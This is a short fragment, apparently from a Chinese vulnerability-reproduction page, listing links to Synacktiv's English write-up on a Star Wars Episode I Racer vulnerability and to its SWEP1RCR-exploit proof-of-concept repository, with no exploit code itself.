-   英文版（Synacktiv 官方翻译）：https://www.synacktiv.com/en/publications/star-wars-episode-i-racer
    
-   SWEP1RCR-exploit PoC 仓库：https://github.com/synacktiv/SWEP1RCR-exploit
    

漏洞复现 · 目录
